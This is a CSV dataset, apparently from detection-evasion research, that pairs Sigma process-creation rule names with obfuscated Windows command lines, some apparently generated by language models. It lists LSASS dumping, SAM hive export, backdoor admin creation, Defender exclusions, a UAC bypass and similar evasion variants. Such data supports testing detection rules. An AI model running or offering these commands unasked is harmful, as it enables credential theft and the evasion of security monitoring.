rule_name,commandline_evasion,row_count,sources
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe -cOMmand ""Get-ChildItem C:\Users\""",3,gemini:2; qwen32b
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe -cOmMand ""Get-ChildItem C:\Users\""",2,gemini:2
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe -cOmmAnd ""Get-LocalUser""",2,gemini:2
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe -cOmmaNd ""Get-LocalUser""",3,gemini:2; qwen32b
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe -coMMAnD ""Get-CimInstance -ClassName Win32_UserAccount""",3,gemini:2; qwen32b
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe -coMmaND ""Get-LocalUser""",3,gemini:2; qwen32b
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe -commANd ""Get-CimInstance -ClassName Win32_UserAccount""",3,gemini:2; qwen32b
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe /""Command"" ""Get-ChildItem C:\Users""",1,gemini
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe /""Command"" ""Get-CimInstance -ClassName Win32_UserAccount""",1,gemini
proc_creation_win_susp_local_system_owner_account_discovery,"powershell.exe /""Command"" ""Get-LocalUser""",1,gemini
proc_creation_win_susp_local_system_owner_account_discovery,wmic useraccount list brief,1,gemini
proc_creation_win_susp_network_command,"""cmd.exe"" /c arp -""a""",1,gemini
proc_creation_win_susp_network_command,"""cmd.exe"" /c ipconfig /a^ll",1,gemini
proc_creation_win_susp_network_command,"""cmd.exe"" /c route pr^int",2,gemini; qwen32b
proc_creation_win_susp_network_command,"""cmd.exe"" /c set C=config && net %C% workstation",1,gemini
proc_creation_win_susp_network_command,"cmd.exe /c ""ipconfig -all""",1,gemini
proc_creation_win_susp_network_command,"cmd.exe /c ""netsh int sh int""",2,gemini; qwen32b
proc_creation_win_susp_network_scan_loop,"cmd.exe /c ""f^o^r /L %i in (1,1,254) do p^i^n^g -n 1 192.168.1.%i""",2,gemini:2
proc_creation_win_susp_priv_escalation_via_named_pipe,"cmd.exe -""c"" e^c^h^o data > \\.\pipe\target_pipe",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"cmd.exe /""c"" e^c^h^o data > \\.\pipe\target_pipe",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,cmd.exe /C e^c^h^o data > \\.\pipe\target_pipe,1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,cmd.exe /c copy /Y data.txt \\.\pipe\target_pipe,1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,cmd.exe /c e^c^h^o data > \\.\pipe\target_pipe,1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe -""Command"" ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe -COMMAnD ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe -COMMaND ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe -CoMMaND ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe -CoMMaNd ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe -Command ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe -c ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe -cOMManD ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_priv_escalation_via_named_pipe,"powershell.exe /""Command"" ""Set-Content -Path '\\.\pipe\target_pipe' -Value 'data'""",1,gemini
proc_creation_win_susp_private_keys_recon,"powershell.exe -Command ""& {Get-ChildItem"""" -Path C:\ -Filter *.key}""",2,gemini; qwen32b
proc_creation_win_susp_private_keys_recon,"powershell.exe -Command ""gci -Path C:\ -Recurse -Filter '*.*ke?'""",1,gemini
proc_creation_win_susp_private_keys_recon,"powershell.exe -Command ""gci -Path C:\ -Recurse -Include *.key""",1,gemini
proc_creation_win_susp_private_keys_recon,powershell.exe -Command Get-ChildItem Cert:\LocalMachine\My\* -Recurse,1,qwen32b
proc_creation_win_susp_private_keys_recon,"powershell.exe -c ""Get-ChildItem -Path C:\ -Recurse -Include *.$('p'+'em')""",2,gemini; qwen32b
proc_creation_win_susp_script_exec_from_env_folder,"cmd.exe /c ""cd C:\Users\Public && wscript.exe payload.vbs""",1,gemini
proc_creation_win_susp_script_exec_from_env_folder,mshta.exe C:/Users/Public/payload.hta,1,gemini
proc_creation_win_susp_script_exec_from_temp,"powershell.exe -""ExecutionPolicy"" Bypass -fILE C:\Windows\Temp\script.ps1 -COmmEnt "" > """,1,gemini
proc_creation_win_susp_script_exec_from_temp,"powershell.exe /""ExecutionPolicy"" Bypass -FILE C:/Windows/Temp/script.ps1",1,gemini
proc_creation_win_susp_script_exec_from_temp,"powershell.exe /""ExecutionPolicy"" Bypass -f C:/Windows/Temp/script.ps1",1,gemini
proc_creation_win_susp_shadow_copies_creation,"cmd.exe -""c"" wmic shadowcopy cr^eate Volume=C:\",4,gemini:3; qwen32b
proc_creation_win_susp_shadow_copies_creation,"powershell.exe -""Command"" ""Invoke-WmiMethod -Class ('Win32_Shad' + 'owCopy') -Name ('Cre' + 'ate') -ArgumentList 'C:\'""",1,gemini
proc_creation_win_susp_shadow_copies_creation,"powershell.exe -COMMaND ""Invoke-WmiMethod -Class ('Win32_Shad' + 'owCopy') -Name ('Cre' + 'ate') -ArgumentList 'C:\'""",4,gemini:3; qwen32b
proc_creation_win_susp_shadow_copies_creation,"powershell.exe -Command ""Invoke-WmiMethod -Class ('Win32_Shad' + 'owCopy') -Name ('Cre' + 'ate') -ArgumentList 'C:\'""",4,gemini:3; qwen32b
proc_creation_win_susp_shadow_copies_creation,"powershell.exe -c ""Invoke-WmiMethod -Class ('Win32_Shad' + 'owCopy') -Name ('Cre' + 'ate') -ArgumentList 'C:\'""",4,gemini:3; qwen32b
proc_creation_win_susp_shadow_copies_creation,"powershell.exe -coMmANd ""Invoke-WmiMethod -Class ('Win32_Shad' + 'owCopy') -Name ('Cre' + 'ate') -ArgumentList 'C:\'""",3,gemini:3
proc_creation_win_susp_shadow_copies_creation,"powershell.exe /""Command"" ""Invoke-WmiMethod -Class ('Win32_Shad' + 'owCopy') -Name ('Cre' + 'ate') -ArgumentList 'C:\'""",2,gemini; qwen32b
proc_creation_win_susp_whoami_as_param,"C:\Windows\System32\cmd.exe /c ""echo Testing""",1,qwen14b
proc_creation_win_susp_whoami_as_param,C:\Windows\System32\cmd.exe /c echo Testing,1,qwen14b
proc_creation_win_susp_whoami_as_param,"cmd.exe -""c"" whoami",1,gemini
proc_creation_win_susp_whoami_as_param,"cmd.exe /""c"" whoami",2,gemini; qwen32b
proc_creation_win_susp_whoami_as_param,powershell.exe -Command whoami,1,qwen32b
proc_creation_win_sysinternals_procdump_evasion,cmd.exe /c ren procdump.exe pd.exe,5,gemini:4; qwen32b
proc_creation_win_sysinternals_procdump_evasion,"powershell.exe -""Command"" ""Move-Item -Path .\lsass.exe_*.dmp -Destination C:\temp\dump.bin""",2,gemini; qwen32b
proc_creation_win_sysinternals_procdump_evasion,"powershell.exe -CoMMaNd ""Copy-Item .\procdump.exe -Destination .\sysdiag.exe""",5,gemini:4; qwen32b
proc_creation_win_sysinternals_procdump_evasion,"powershell.exe -Command ""Copy-Item .\procdump.exe -Destination .\sysdiag.exe""",5,gemini:4; qwen32b
proc_creation_win_sysinternals_procdump_evasion,"powershell.exe -c ""Copy-Item .\procdump.exe -Destination .\sysdiag.exe""",5,gemini:4; qwen32b
proc_creation_win_sysinternals_procdump_evasion,"powershell.exe -cOMmAND ""Copy-Item .\procdump.exe -Destination .\sysdiag.exe""",5,gemini:4; qwen32b
proc_creation_win_sysinternals_procdump_evasion,"powershell.exe -coMMAND ""Copy-Item .\procdump.exe -Destination .\sysdiag.exe""",5,gemini:4; qwen32b
proc_creation_win_sysinternals_procdump_evasion,robocopy C:\Sysinternals C:\temp procdump.exe,5,gemini:4; qwen32b
proc_creation_win_sysinternals_procdump_lsass,"cmd.exe /""c"" procdump.exe -""m^a"" l^sass.exe C:\temp\dump.bin",4,gemini:4
proc_creation_win_sysinternals_psexec_paexec_escalate_system,"""C:\Users\Public\Temp\PsExec.exe"" -i -s ""cmd"" -accepteula",1,gemini
proc_creation_win_sysinternals_psexec_paexec_escalate_system,"""C:\Users\Public\Temp\PsExec.exe"" -i -s cmd.exe -accepteula",1,gemini
proc_creation_win_sysinternals_psexec_paexec_escalate_system,"""C:\Users\Public\Temp\PsExec.exe"" -s -i -d cmd -accepteula",1,gemini
proc_creation_win_sysinternals_psexec_paexec_escalate_system,"cmd.exe /c """"C:\Users\Public\Temp\PsExec.exe"" -i -s^ cmd -accepteula""",1,gemini
proc_creation_win_sysprep_appdata,"cmd.exe -""c"" ""cd C:\Users\Default\AppData\Local\Temp && C:\Windows\System32\sysprep\sysprep.exe /unattend:payload.xml""",1,gemini
proc_creation_win_sysprep_appdata,"cmd.exe /""c"" ""cd C:\Users\Default\AppData\Local\Temp && C:\Windows\System32\sysprep\sysprep.exe /unattend:payload.xml""",1,gemini
proc_creation_win_sysprep_appdata,"cmd.exe /C ""cd C:\Users\Default\AppData\Local\Temp && C:\Windows\System32\sysprep\sysprep.exe /unattend:payload.xml""",1,gemini
proc_creation_win_sysprep_appdata,"cmd.exe /c ""cd C:\Users\Default\AppData\Local\Temp && C:\Windows\System32\sysprep\sysprep.exe /unattend:payload.xml""",1,gemini
proc_creation_win_takeown_recursive_own,"takeown.exe ""/f"" C:\Users	haim\AppData\Local\Temp\T1222.001_takeown_folder ""/r""",2,gemini; qwen32b
proc_creation_win_takeown_recursive_own,takeown.exe -f C:\Users	haim\AppData\Local\Temp\T1222.001_takeown_folder -r,1,gemini
proc_creation_win_takeown_recursive_own,takeown.exe -f C:\Users\thaim\AppData\Local\Temp\T1222.001_takeown_folder -r,2,gemini; qwen32b
proc_creation_win_tasklist_module_enumeration,"cmd.exe -""c"" tasklist.exe /m rdpco^rets.dll",2,gemini; qwen32b
proc_creation_win_tasklist_module_enumeration,"cmd.exe /""c"" tasklist.exe /m rdpco^rets.dll",2,gemini; qwen32b
proc_creation_win_tasklist_module_enumeration,"cmd.exe /c tasklist.exe -""m"" rdpco^rets.dll",2,gemini; qwen32b
proc_creation_win_tasklist_module_enumeration,"powershell.exe -""Command"" ""Get-Process | Where-Object { $_.Modules.ModuleName -contains 'rdpcorets.dll' }""",2,gemini; qwen32b
proc_creation_win_tasklist_module_enumeration,"powershell.exe -CoMManD ""Get-Process | Where-Object { $_.Modules.ModuleName -contains 'rdpcorets.dll' }""",2,gemini; qwen32b
proc_creation_win_tasklist_module_enumeration,"powershell.exe -ComMAnd ""Get-Process | Where-Object { $_.Modules.ModuleName -contains 'rdpcorets.dll' }""",2,gemini; qwen32b
proc_creation_win_tasklist_module_enumeration,"powershell.exe -CommaNd ""Get-Process | Where-Object { $_.Modules.ModuleName -contains 'rdpcorets.dll' }""",1,gemini
proc_creation_win_tasklist_module_enumeration,"powershell.exe -Command ""Get-Process | Where-Object { $_.Modules.ModuleName -contains 'rdpcorets.dll' }""",2,gemini; qwen32b
proc_creation_win_tasklist_module_enumeration,"powershell.exe -c ""Get-Process | Where-Object { $_.Modules.ModuleName -contains 'rdpcorets.dll' }""",1,gemini
proc_creation_win_tasklist_module_enumeration,"powershell.exe /""Command"" ""Get-Process | Where-Object { $_.Modules.ModuleName -contains 'rdpcorets.dll' }""",1,gemini
proc_creation_win_tscon_rdp_redirect,"cmd.exe /k tscon 1337 ""/dest:rdp-tcp#55""",1,gemini
proc_creation_win_tscon_rdp_redirect,cmd.exe /k tscon 1337 -dest:rdp-tcp#55,1,gemini
proc_creation_win_uac_bypass_cmstp,"cmstp.exe ""C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003_uacbypass.inf""",2,gemini:2
proc_creation_win_uac_bypass_cmstp,"cmstp.exe -s ""C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003_uacbypass.inf"" -au",2,gemini:2
proc_creation_win_uac_bypass_cmstp,cmstp.exe /s C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003.inf,2,gemini:2
proc_creation_win_uac_bypass_cmstp,cmstp.exe /s C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003_uacbypass.inf /au,3,gemini:2; qwen32b
proc_creation_win_uac_bypass_cmstp,copy cmstp.exe not_cmstp.exe && not_cmstp.exe /S /AU C:\Users\Public\Downloads\payload.inf,3,gemini:2; qwen32b
proc_creation_win_verclsid_runs_com,verclsid.exe -S -C {11111111-2222-3333-4444-555555555555},1,gemini
proc_creation_win_virtualbox_execution,"cmd.exe /c """"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" st^artvm ""Atomic VM""""",2,gemini; qwen32b
proc_creation_win_virtualbox_execution,"rundll32 ""C:\Program Files\Oracle\VirtualBox\VBoxRT"".dll,RTR3Init",2,gemini; qwen32b
proc_creation_win_virtualbox_execution,"rundll32 ""C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,^R^T^R^3^I^n^i^t""",2,gemini; qwen32b
proc_creation_win_vscode_tunnel_service_install,copy code.exe not_code.exe && not_code.exe tunnel service internal-run --log-file bypass.log,1,gemini
proc_creation_win_w32tm,W32tm  -stripchart -computer:localhost -period:5 -dataonly -samples:2,1,gemini
proc_creation_win_w32tm,w32tm.exe -stripchart -computer:localhost -period:5 -dataonly -samples:2,1,gemini
proc_creation_win_webshell_chopper,"cmd.exe -""c"" w^hoami&echo [S]",9,gemini:8; qwen32b
proc_creation_win_webshell_chopper,"cmd.exe /""c"" ""&wh^oami&ec^ho""",8,gemini:7; qwen32b
proc_creation_win_webshell_chopper,"cmd.exe /""c"" w^hoami&echo [S]",8,gemini:7; qwen32b
proc_creation_win_webshell_chopper,"cmd.exe /c ""ipconfig & echo Test""",3,qwen14b:2; qwen32b
proc_creation_win_webshell_chopper,"cmd.exe /c ""ipconfig && echo Test""",3,qwen14b:2; qwen32b
proc_creation_win_webshell_chopper,cmd.exe /c ipconfig && echo Test,3,qwen14b:2; qwen32b
proc_creation_win_webshell_chopper,"cscript //nologo wscript.exe ""&ipconfig&echo"" > output.txt",2,qwen32b:2
proc_creation_win_webshell_chopper,"powershell.exe -Command ""& { whoami; echo }""",2,qwen32b:2
proc_creation_win_webshell_hacking,"certutil.exe -urlcache -f -decode="""" C:\encoded.txt C:\decoded.exe",3,gemini:2; qwen32b
proc_creation_win_webshell_hacking,"cmd.exe -""c"" ""n^e^t u^s^e^r t^e^s^t^u^s^e^r P^a^s^s^w^o^r^d /a^d^d""",8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,"cmd.exe -""c"" reg s^ave HKLM\SAM C:\temp\sam.save",8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,"cmd.exe /""c"" ""n^e^t u^s^e^r t^e^s^t^u^s^e^r P^a^s^s^w^o^r^d /a^d^d""",8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,"cmd.exe /""c"" reg s^ave HKLM\SAM C:\temp\sam.save",8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,cmd.exe /C reg s^ave HKLM\SAM C:\temp\sam.save,8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,cmd.exe /c reg s^ave HKLM\SAM C:\temp\sam.save,7,gemini:6; qwen32b
proc_creation_win_webshell_hacking,"powershell.exe -""Command"" ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",2,gemini; qwen32b
proc_creation_win_webshell_hacking,"powershell.exe -COmmANd ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,"powershell.exe -Command ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,powershell.exe -NoProfile -WindowStyle 1 C:\script.ps1,2,gemini:2
proc_creation_win_webshell_hacking,"powershell.exe -c ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,"powershell.exe -coMMAnd ""Get-WmiObject -Class Win32_UserAccount -Filter \"" Name='guest'\"" | Set-WmiInstance -Arguments @{PasswordExpires=$false}""",1,gemini
proc_creation_win_webshell_hacking,"powershell.exe -comMAnD ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",8,gemini:7; qwen32b
proc_creation_win_webshell_hacking,"powershell.exe /""Command"" ""Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'""",1,gemini
proc_creation_win_webshell_recon_commands_and_processes,ping.exe /n 4 10.10.10.10,8,gemini:7; qwen32b
proc_creation_win_webshell_recon_commands_and_processes,"powershell.exe /""ec"" JAB0AD0AMQA=",2,gemini; qwen32b
proc_creation_win_webshell_tool_recon,"cmd.exe /c ""p^y^t^h^o^n -h""",2,gemini; qwen32b
proc_creation_win_webshell_tool_recon,"cmd.exe /c ""perl --help""",1,qwen14b
proc_creation_win_webshell_tool_recon,"cmd.exe /c ""python -h""",1,qwen14b
proc_creation_win_webshell_tool_recon,perl -\-help,1,qwen32b
proc_creation_win_webshell_tool_recon,perl -h,1,qwen32b
proc_creation_win_webshell_tool_recon,python  -h,2,gemini; qwen32b
proc_creation_win_webshell_tool_recon,python --h\elp,1,qwen32b
proc_creation_win_webshell_tool_recon,python -V,1,gemini
proc_creation_win_webshell_tool_recon,python -h,1,qwen32b
proc_creation_win_webshell_tool_recon,python.exe -h,1,gemini
proc_creation_win_werfault_lsass_shtinkering,"C:\Windows\system32\Werfault.exe ""-u"" ""-p"" 744 ""-ip"" 1112 ""-s"" 244",2,gemini; qwen32b
proc_creation_win_werfault_lsass_shtinkering,C:\Windows\system32\Werfault.exe -u  -p 744 -ip 1112 -s 244,1,gemini
proc_creation_win_werfault_lsass_shtinkering,C:\Windows\system32\Werfault.exe -u -ip 789 -p 456 -s 101,1,qwen32b
proc_creation_win_werfault_lsass_shtinkering,C:\Windows\system32\Werfault.exe -u -p 456 -ip 789 -s 101,3,qwen32b:3
proc_creation_win_werfault_lsass_shtinkering,C:\Windows\system32\Werfault.exe -u -p 744 -ip 1112 -s 244,1,gemini
proc_creation_win_werfault_lsass_shtinkering,C:\\Windows\\system32\\Werfault.exe -u -p 456 -ip 789 -s 101,1,qwen32b
proc_creation_win_werfault_lsass_shtinkering,Werfault.exe -u -p 744 -ip 1112 -s 244,1,qwen14b
proc_creation_win_werfault_lsass_shtinkering,Werfault.exe -u -p 744 -ip 1112 -s 244 -d C:\Lab\input\sample.txt,2,qwen14b; qwen32b
proc_creation_win_werfault_lsass_shtinkering,Werfault.exe -u -p 744 -ip 1112 -s 244 -dummy,2,qwen14b; qwen32b
proc_creation_win_werfault_reflect_debugger_exec,C:\Windows\System32\WerFault.exe -prC:\Windows\System32\notepad.exe,2,gemini:2
proc_creation_win_werfault_reflect_debugger_exec,"WerFault.exe -pr"" C:\Malicious\Payload.exe""",2,qwen32b:2
proc_creation_win_where_browser_data_recon,where /R C:\Users\ *ookmarks,2,gemini; qwen32b
proc_creation_win_winget_add_insecure_custom_source,"powershell.exe -""c"" ""$cmd='winget.exe'; $args=@('"" source""', '""add""' , '-N' , 'test' , '""http://10.10.10.10""' ); & $cmd $args""",2,gemini:2
proc_creation_win_winget_add_insecure_custom_source,"powershell.exe -Command ""$cmd='winget.exe'; $args=@('"" source""', '""add""' , '-n' , 'test' , '""http://10.10.10.10""' ); & $cmd $args""",2,gemini:2
proc_creation_win_winget_add_insecure_custom_source,"powershell.exe -c ""$cmd='winget.exe'; $args=@('"" source""', '""add""' , '-n' , 'test' , '""http://10.10.10.10""' ); & $cmd $args""",3,gemini:2; qwen32b
proc_creation_win_winget_add_insecure_custom_source,"powershell.exe /""c"" ""$cmd='winget.exe'; $args=@('"" source""', '""add""' , '-n' , 'test' , '""http://10.10.10.10""' ); & $cmd $args""",3,gemini:2; qwen32b
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" -""n"" evader_repo -a ""http://192.168.1.100/repo""",3,gemini:2; qwen32b
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" -""n"" evader_repo /""a"" ""http://192.168.1.100/repo""",3,gemini:2; qwen32b
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" --no-deps evader_repo -""a"" ""http://192.168.1.100/repo""",3,gemini:2; qwen32b
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" -N evader_repo --accept-source-arms ""http://192.168.1.100/repo""",3,gemini:2; qwen32b
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" -n evader_repo --accept-source-arms ""http://192.168.1.100/repo""",2,gemini:2
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" -n evader_repo -A ""http://192.168.1.100/repo""",2,gemini:2
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" -n evader_repo -a ""http://192.168.1.100/repo""",2,gemini:2
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" /""n"" evader_repo -""a"" ""http://192.168.1.100/repo""",2,gemini:2
proc_creation_win_winget_add_insecure_custom_source,"winget.exe ""source"" ""add"" /""n"" evader_repo -a ""http://192.168.1.100/repo""",3,gemini:2; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -""Command"" ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance /""Arguments"" @{PasswordExpires=$false}""",2,gemini; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -""Command"" ""Set-LocalUser -Name 'guest' -PasswordNeverExpires $true""",1,gemini
proc_creation_win_wmi_password_never_expire,"powershell.exe -COMMAnd ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance /""Arguments"" @{PasswordExpires=$false}""",1,gemini
proc_creation_win_wmi_password_never_expire,"powershell.exe -COmMANd ""Set-LocalUser -Name 'guest' -PasswordNeverExpires $true""",5,gemini:4; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -Command ""Set-LocalUser -Name 'guest' -PasswordNeverExpires $true""",5,gemini:4; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -c ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -Arguments @{PasswordExpires=$false}""",2,gemini; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -c ""Set-LocalUser -Name 'guest' -PasswordNeverExpires $true""",5,gemini:4; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -cOMMANd ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -""Arguments"" @{PasswordExpires=$false}""",2,gemini; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -cOMMand ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -Arguments @{PasswordExpires=$false}""",2,gemini; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -cOmmAnD ""Set-LocalUser -Name 'guest' -PasswordNeverExpires $true""",5,gemini:4; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -coMMAnd ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -Arguments @{PasswordExpires=$false}""",1,gemini
proc_creation_win_wmi_password_never_expire,"powershell.exe -coMmAND ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -""Arguments"" @{PasswordExpires=$false}""",2,gemini; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe -coMmAnd ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -""Arguments"" @{PasswordExpires=$false}""",1,gemini
proc_creation_win_wmi_password_never_expire,"powershell.exe -comMand ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -Arguments @{PasswordExpires=$false}""",1,gemini
proc_creation_win_wmi_password_never_expire,"powershell.exe -commAnd ""Set-LocalUser -Name 'guest' -PasswordNeverExpires $true""",5,gemini:4; qwen32b
proc_creation_win_wmi_password_never_expire,"powershell.exe /""Command"" ""Get-WmiObject -Class Win32_UserAccount -Filter "" Name='guest'"" | Set-WmiInstance -Arguments @{PasswordExpires=$false}""",1,gemini
proc_creation_win_wmi_password_never_expire,"powershell.exe /""Command"" ""Set-LocalUser -Name 'guest' -PasswordNeverExpires $true""",1,gemini
proc_creation_win_wmi_password_never_expire,wmic useraccount where name='guest' set passwordexpires=0,1,gemini
proc_creation_win_wmic_namespace_defender,"powershell.exe -""Command"" ""Invoke-CimMethod -Namespace 'root\Microsoft\Windows\Defender' -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath='C:\Malware'}""",3,gemini:2; qwen32b
proc_creation_win_wmic_namespace_defender,"powershell.exe -Command ""Invoke-CimMethod -Namespace 'root\Microsoft\Windows\Defender' -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath='C:\Malware'}""",5,gemini:4; qwen32b
proc_creation_win_wmic_namespace_defender,"powershell.exe -c ""Invoke-CimMethod -Namespace 'root\Microsoft\Windows\Defender' -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath='C:\Malware'}""",5,gemini:4; qwen32b
proc_creation_win_wmic_namespace_defender,"powershell.exe -cOmmANd ""Invoke-CimMethod -Namespace 'root\Microsoft\Windows\Defender' -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath='C:\Malware'}""",5,gemini:4; qwen32b
proc_creation_win_wmic_namespace_defender,"powershell.exe /""Command"" ""Invoke-CimMethod -Namespace 'root\Microsoft\Windows\Defender' -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath='C:\Malware'}""",3,gemini:2; qwen32b
proc_creation_win_wmic_namespace_defender,wmic.exe -Namespace:\\root\Microsoft\Windows\Defender,3,qwen14b:2; qwen32b
proc_creation_win_wmic_process_creation,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""[wmiclass]'Win32_Process'.Create('calc.exe')""",1,gemini
proc_creation_win_wmic_process_creation,"powershell.exe -nop -wiNDOWSTyLe Hidden -c ""[wmiclass]'Win32_Process'.Create('calc.exe')""",2,gemini; qwen32b
proc_creation_win_wmic_recon_group,powershell.exe Get-LocalGroup,1,gemini
proc_creation_win_wmic_recon_group,wmic.exe /namespace:\root\cimv2 path win32_group get /format:csv,2,qwen14b; qwen32b
proc_creation_win_wmic_recon_group,wmic.exe /namespace:\root\cimv2 path win32_group get name,1,qwen14b
proc_creation_win_wmic_recon_group,"wmic.exe /namespace:\root\cimv2 path win32_group get name,description",2,qwen14b; qwen32b
proc_creation_win_wmic_recon_hotfix,"powershell.exe -""Command"" ""Get-HotFix""",2,gemini; qwen32b
proc_creation_win_wmic_recon_hotfix,"powershell.exe -Command ""Get-HotFix""",2,gemini; qwen32b
proc_creation_win_wmic_recon_hotfix,"powershell.exe -c ""Get-HotFix""",2,gemini; qwen32b
